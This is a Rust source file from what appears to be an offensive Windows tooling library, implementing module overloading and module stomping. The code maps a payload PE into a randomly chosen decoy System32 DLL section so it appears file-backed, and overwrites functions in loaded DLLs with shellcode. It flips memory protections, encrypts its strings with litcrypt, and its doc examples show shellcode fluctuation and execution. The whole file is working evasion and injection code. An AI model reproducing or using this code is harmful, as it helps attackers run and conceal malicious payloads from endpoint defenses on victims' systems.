#[macro_use]
extern crate litcrypt2;
use_litcrypt!();

use std::{env, fs, path::Path, ptr, ffi::c_void};
use nanorand::{WyRand, Rng};
use windows::Win32::Foundation::HANDLE;
use data::{PeMetadata, PVOID, PAGE_READWRITE, PeManualMap, PAGE_EXECUTE_READ};
use winproc::Process;

fn find_suitable_module(function_size: u32) -> isize
{
    let process = Process::current();
    let modules = process.module_list().unwrap();
    let mut suitable_text_sections: Vec<isize> = vec![];
    for m in modules
    {
        let module_base_address = m.handle() as isize;
        let offset = is_suitable(function_size, module_base_address);
        if offset != 0 && !m.name().unwrap().contains(".exe")
        {
            return module_base_address + offset as isize;
        }
        
        let module_metadata = manualmap::get_pe_metadata(module_base_address as *const u8);
        if module_metadata.is_ok()
        {
            let pe_metadata = module_metadata.unwrap();
            for section in pe_metadata.sections
            {   
                let s = std::str::from_utf8(&section.Name).unwrap();
                if s.contains(".text") 
                {
                    unsafe
                    {
                        if section.Misc.VirtualSize > function_size
                        {
                            suitable_text_sections.push(module_base_address);
                        }
                    }
                }
            }
        }    
    }

    if suitable_text_sections.len() > 0
    {
        return suitable_text_sections[0];
    }

    0
}

fn is_suitable(function_size: u32, module_base_address: isize) -> u32
{
    unsafe
    {
        let exception_directory = manualmap::get_runtime_table(module_base_address as *mut _);
        let mut rt = exception_directory.0;
        if rt == ptr::null_mut()
        {
            return 0;
        }
        
        let items = exception_directory.1 / 12;
        let mut count = 0;
        while count < items
        {   
            let runtime_function = *rt;
            let size = runtime_function.end_addr - runtime_function.begin_addr;
            if size > function_size
            {
                return runtime_function.begin_addr;
            }
    
            rt = rt.add(1);
            count += 1;
        }
    }
    
    0
}

/// Locate a legitimate module of certain minimun size.
/// 
/// It will return the path of the selected module or an empty string in case 
/// that it fails to find a suitable module.
pub fn find_decoy_module (min_size: i64) -> String
{

    let directory_path =  format!("{}\\{}",env::var("WINDIR").unwrap(), "System32");
    let mut files:Vec<String> = vec![];
    for entry in fs::read_dir(directory_path).unwrap()
    {
        let p = entry.unwrap();
        let path = p.path();

        if !path.is_dir() &&  path.to_str().unwrap().ends_with(".dll")
        {
            let slice:Vec<String> = path.to_str().unwrap().to_string().split("\\").map(str::to_string).collect();
            files.push(slice[slice.len() - 1].to_string());
        }
    }

    let process = Process::current();
    let modules = process.module_list().unwrap();
    let mut remove: Vec<i32> = vec![];
    for m in modules
    {   
        let mut c = 0;
        for f in &files
        {
            if f.to_lowercase() == m.name().unwrap().to_lowercase()
            {
                remove.push(c);
            }
            c = c + 1;
        }
    }

    for r in remove
    {
        files.remove(r as usize);
    }

    let mut rng = WyRand::new();
    while files.len() > 0
    {
        let r = rng.generate_range(0..files.len());
        let path =  format!("{}\\{}\\{}",env::var("WINDIR").unwrap(), "System32", &files[r]);
        let size = fs::metadata(&path).unwrap().len() as i64;
        if size > (min_size * 2)
        {
            return path;
        }
        else
        {
            files.remove(r);
        }
    }


    "".to_string()
} 

/// Locate and load a decoy module into memory creating a legitimate file-backed memory section within the process.
/// Afterwards overload that module by manually mapping a payload (from disk) that will appear to be file-backed  
/// by the legitimate decoy module.
///
/// It will return either a pair (PeMetadata,i64) containing the mapped PE (payload)
/// metadata and its base address or a String with a descriptive error message.
///
/// # Examples
///
/// ```
/// let module = overload::read_and_overload("c:\\temp\\payload.dll","");
///
/// match module {
///     Ok(x) => println!("File-backed payload is located at 0x{:X}.", x.1),
///     Err(e) => println!("An error has occurred: {}", e),      
/// }
/// ```
pub fn read_and_overload(payload_path: &str, decoy_module_path: &str) -> Result<(PeMetadata,isize), String>
{

    if !Path::new(payload_path).is_file()
    {
        return Err(lc!("[x] Payload file not found."));
    }


    let file_content = fs::read(payload_path).expect(&lc!("[x] Error opening the payload file."));
    let result = overload_module(file_content, decoy_module_path)?;

    Ok(result)
}

/// Locate and load a decoy module into memory creating a legitimate file-backed memory section within the process.
/// Afterwards overload that module by manually mapping a payload (from memory) that will appear to be file-backed 
/// by the legitimate decoy module.
///
/// It will return either a pair (PeMetadata,i64) containing the mapped PE (payload)
/// metadata and its base address or a String with a descriptive error message.
///
/// # Examples
///
/// ```
/// use std::fs;
///
/// let payload_content = fs::read("c:\\temp\\payload.dll").expect("[x] Error opening the specified file.");
/// let module = overload::overload_module(payload_content,"");
///
/// match module {
///     Ok(x) => println!("File-backed payload is located at 0x{:X}.", x.1),
///     Err(e) => println!("An error has occurred: {}", e),      
/// }
/// ```
pub fn overload_module (file_content: Vec<u8>, decoy_module_path: &str) -> Result<(PeMetadata,isize), String> 
{   
    let mut decoy_module_path = decoy_module_path.to_string();
    if decoy_module_path != ""
    {
        if !Path::new(&decoy_module_path).is_file()
        {
            return Err(lc!("[x] Decoy file not found."));
        }
        
        let decoy_content = fs::read(&decoy_module_path).expect(&lc!("[x] Error opening the decoy file."));
        if decoy_content.len() < file_content.len()
        {
            return Err(lc!("[x] Decoy module is too small to host the payload."));
        }

    }
    else
    {
        decoy_module_path = find_decoy_module(file_content.len() as i64);
        if decoy_module_path == ""
        {
            return Err(lc!("[x] Failed to find suitable decoy module."));
        }
        
    }

        let decoy_metadata: (PeManualMap, HANDLE) = manualmap::map_to_section(&decoy_module_path)?;

        let result: (PeMetadata,isize) = overload_to_section(file_content, decoy_metadata.0)?;

        Ok(result)
}

/// Load a payload from memory to an existing memory section.
///
/// It will return either a pair (PeMetadata,i64) containing the mapped PE (payload)
/// metadata and its base address or a String with a descriptive error message.
///
/// # Examples
///
/// ```
/// use std::fs;
///
/// let payload_content = fs::read("c:\\temp\\payload.dll").expect("[x] Error opening the specified file.");
/// let section_metadata: (PeManualMap, HANDLE) = manualmap::map_to_section("c:\\windows\\system32\\signedmodule.dll")?;
/// let module: (PeMetadata,i64) = overload_to_section(payload_content, section_metadata.0)?;
/// 
/// match module {
///     Ok(x) => println!("File-backed payload is located at 0x{:X}.", x.1),
///     Err(e) => println!("An error has occurred: {}", e),      
/// }
/// ```
pub fn overload_to_section (file_content: Vec<u8>, section_metadata: PeManualMap) -> Result<(PeMetadata,isize), String>
{
    unsafe
    {
        let region_size: usize;
        if section_metadata.pe_info.is_32_bit
        {
            region_size = section_metadata.pe_info.opt_header_32.SizeOfImage as usize;
        }
        else
        {
            region_size = section_metadata.pe_info.opt_header_64.size_of_image as usize;
        }

        let size: *mut usize = std::mem::transmute(&region_size);
        let base_address: *mut PVOID = std::mem::transmute(&section_metadata.base_address);
        let old_protection: *mut u32 = std::mem::transmute(&u32::default());
        let r = dinvoke::nt_protect_virtual_memory(
            HANDLE { 0: -1}, 
            base_address, 
            size, 
            PAGE_READWRITE, 
            old_protection
        );

        if r != 0
        {
            return Err(lc!("[x] Error changing memory protection."));
        }
        
        dinvoke::rtl_zero_memory(*base_address, region_size);
        
        let module_ptr: *const u8 = std::mem::transmute(file_content.as_ptr());
        let pe_info = manualmap::get_pe_metadata(module_ptr)?;
        
        manualmap::map_module_to_memory(module_ptr, *base_address, &pe_info)?;
        manualmap::relocate_module(&pe_info, *base_address);
        manualmap::rewrite_module_iat(&pe_info, *base_address)?;
        manualmap::set_module_section_permissions(&pe_info, *base_address)?;

        Ok((pe_info, *base_address as isize))
    }
}

/// Locate and load a decoy module into memory creating a legitimate file-backed memory section within the process.
/// Afterwards overload that module by manually mapping a payload (from disk) that will appear to be file-backed  
/// by the legitimate decoy module.
///
/// It will return either a pair ((Vec<u8>,Vec<u8>),i64) containing the mapped PE's (payload)
/// content, the decoy module's content and the payload's base address or a string with a descriptive error messsage.
///
/// # Examples
///
/// ```
/// let module = overload::read_and_overload("c:\\temp\\payload.dll","");
///
/// match module {
///     Ok(x) => println!("File-backed payload is located at 0x{:X}.", x.1),
///     Err(e) => println!("An error has occurred: {}", e),      
/// }
/// ```
pub fn managed_read_and_overload (payload_path: &str, decoy_module_path: &str) -> Result<((Vec<u8>,Vec<u8>),isize), String>
{

    if !Path::new(payload_path).is_file()
    {
        return Err(lc!("[x] Payload file not found."));
    }


    let file_content = fs::read(payload_path).expect(&lc!("[x] Error opening the payload file."));
    let result = managed_overload_module(file_content.clone(), decoy_module_path)?;

    Ok(((file_content, result.0), result.1))
}

/// Locate and load a decoy module into memory creating a legitimate file-backed memory section within the process.
/// Afterwards overload that module by manually mapping a payload (from memory) that will appear to be file-backed 
/// by the legitimate decoy module.
///
/// It will return either a pair (Vec<u8>,i64) containing the decoy content and the payload base address or a string
/// with a descriptive error message.
///
/// # Examples
///
/// ```
/// use std::fs;
///
/// let payload_content = fs::read("c:\\temp\\payload.dll").expect("[x] Error opening the specified file.");
/// let module = overload::overload_module(payload_content,"");
///
/// match module {
///     Ok(x) => println!("File-backed payload is located at 0x{:X}.", x.1),
///     Err(e) => println!("An error has occurred: {}", e),      
/// }
/// ```
pub fn managed_overload_module (file_content: Vec<u8>, decoy_module_path: &str) -> Result<(Vec<u8>,isize), String> 
{   
    let mut decoy_module_path = decoy_module_path.to_string();
    let decoy_content;
    
    if decoy_module_path != ""
    {
        if !Path::new(&decoy_module_path).is_file()
        {
            return Err(lc!("[x] Decoy file not found."));
        }
        
        decoy_content = fs::read(&decoy_module_path).expect(&lc!("[x] Error opening the decoy file."));
        if decoy_content.len() < file_content.len()
        {
            return Err(lc!("[x] Decoy module is too small to host the payload."));
        }
    }
    else
    {
        decoy_module_path = find_decoy_module(file_content.len() as i64);
        if decoy_module_path == ""
        {
            return Err(lc!("[x] Failed to find suitable decoy module."));
        }
        decoy_content = fs::read(&decoy_module_path).expect(&lc!("[x] Error opening the decoy file."));        
    }

        let decoy_metadata: (PeManualMap, HANDLE) = manualmap::map_to_section(&decoy_module_path)?;

        let result: (PeMetadata,isize) = overload_to_section(file_content, decoy_metadata.0)?;

        Ok((decoy_content, result.1))
}

/// Stomp a shellcode on a loaded module.
/// The first parameter of this function is the shellcode's content. The next two parameters modify the behaviour of the function.
/// 
/// The stomp_address parameter can be used to indicate where the shellcode should be written to. If this parameter is non zero, the function
/// will try to stomp the shellcode in that particular address. 
/// The module_base_address parameter can be used to point to the memory base address of a dll where this function should look for a suitable spot
/// to stomp the shellcode to. If this parameter is non zero, the function will try to locate a big enough function inside that specific dll to stomp the shellcode to it.
/// 
/// If stomp_address and module_base_address are both zero the function will iterate over all loaded module and will try to find a suitable region to stomp the shellcode to it.
/// 
/// This function returns either a pair (Vec<u8>,i64) containing the legitimate content of the region where the shellcode has been stomped to and the address where it has been written to or a string
/// with a descriptive error message.
/// 
/// # Examples
/// ## Stomp the shellcode on a specific address
///
/// ```
/// let payload_content = download_function();
/// let my_dll = dinvoke::load_library_a("somedll.dll");
/// let my_big_enough_function = dinvoke::get_function_address(my_dll, "my_function");
/// let module = overload::managed_module_stomping(&payload_content, my_big_enough_function, 0);
///
/// match module {
///     Ok(x) => println!("The shellcode has been written to 0x{:X}.", x.1),
///     Err(e) => println!("An error has occurred: {}", e),      
/// }
/// ```
/// 
/// ## Look for a suitable function inside a specific dll and stomp the shellcode there
///
/// ```
/// let payload_content = download_function();
/// let my_dll = dinvoke::load_library_a("somedll.dll");
/// let module = overload::managed_module_stomping(&payload_content, 0, my_dll);
///
/// match module {
///     Ok(x) => println!("The shellcode has been written to 0x{:X}.", x.1),
///     Err(e) => println!("An error has occurred: {}", e),      
/// }
/// ```
/// 
/// ## Look for a suitable function inside any loaded dll and stomp the shellcode there
///
/// ```
/// let payload_content = download_function();
/// let module = overload::managed_module_stomping(&payload_content, 0, 0);
///
/// match module {
///     Ok(x) => println!("The shellcode has been written to 0x{:X}.", x.1),
///     Err(e) => println!("An error has occurred: {}", e),      
/// }
/// ```
/// 
/// ## Module stomping + shellcode fluctuation
/// 
/// ```
/// let payload_content = download_function();
/// let my_dll = dinvoke::load_library_a("somedll.dll");
/// let overload = overload::managed_module_stomping(&payload_content, 0, my_dll).unwrap();
/// let mut manager = dmanager::Manager::new();
/// let _r = manager.new_shellcode(overload.1, payload_content, overload.0).unwrap(); // The manager will take care of the fluctuation process
/// let _r = manager.hide_shellcode(overload.1).unwrap(); // We restore the memory's original content and hide our shellcode
/// ... 
/// let _r = manager.stomp_shellcode(overload.1).unwrap(); // When we need our shellcode's functionality, we restomp it to the same location so we can execute it
/// let run: unsafe extern "system" fn () = std::mem::transmute(overload.1);
/// run();
/// let _r = manager.hide_shellcode(overload.1).unwrap(); // We hide the shellcode again
/// ```
pub fn managed_module_stomping(payload_content: &Vec<u8>, mut stomp_address: isize, module_base_address: isize) -> Result<(Vec<u8>,isize), String>
{
    unsafe
    {
        let process_handle = HANDLE(-1);
        let size = payload_content.len() as u32;
        if size == 0
        {
            return Err(lc!("[x] Invalid payload."));
        }

        if stomp_address == 0
        {
            if module_base_address != 0
            {
                let offset = is_suitable(size, module_base_address);
                if offset != 0
                {
                    stomp_address = module_base_address + offset as isize;
                }
                else 
                {
                    return Err(lc!("[x] The selected module is not valid to stomp the payload."));
                }
            }
            else 
            {
                stomp_address = find_suitable_module(size);
            }

            if stomp_address == 0
            {
                return Err(lc!("[x] Failed to find suitable module to stomp to."));
            }
        }
        
        let stomp_address_clone = stomp_address;
        let real_content = vec![0u8;size as usize];
        let buffer = std::mem::transmute(real_content.as_ptr());
        let written = usize::default();
        let bytes_written: *mut usize = std::mem::transmute(&written);
        let ret = dinvoke::nt_read_virtual_memory(
            process_handle, 
            stomp_address_clone as *mut _, 
            buffer, 
            size as usize, 
            bytes_written
        );

        if ret != 0
        {
            return Err(lc!("[x] Memory read failed."));
        } 

        let base_address: *mut PVOID = std::mem::transmute(&stomp_address_clone);
        let s = size as usize;
        let s: *mut usize = std::mem::transmute(&s);
        let o = u32::default();
        let old_protection: *mut u32 = std::mem::transmute(&o);
        let ret = dinvoke::nt_protect_virtual_memory(process_handle, base_address, s, PAGE_READWRITE, old_protection);

        if ret != 0
        {
            return Err(lc!("[x] Error changing memory permissions."));
        }

        let buffer: *mut c_void = std::mem::transmute(payload_content.as_ptr());
        let written: usize = 0;
        let bytes_written: *mut usize = std::mem::transmute(&written);
        let ret_write = dinvoke::nt_write_virtual_memory(process_handle, stomp_address as *mut _, buffer, size as usize, bytes_written);

        let base_address: *mut PVOID = std::mem::transmute(&stomp_address_clone);
        let s = size as usize;
        let s: *mut usize = std::mem::transmute(&s);
        let o = u32::default();
        let old_protection: *mut u32 = std::mem::transmute(&o);
        let ret = dinvoke::nt_protect_virtual_memory(process_handle, base_address, s, PAGE_EXECUTE_READ, old_protection);

        if ret_write != 0
        {
            return Err(lc!("[x] Payload writing failed."));
        }

        if ret != 0
        {
            return Err(lc!("[x] Could not restore memory permissions."));
        }

        Ok((real_content,stomp_address)) 
    }
}

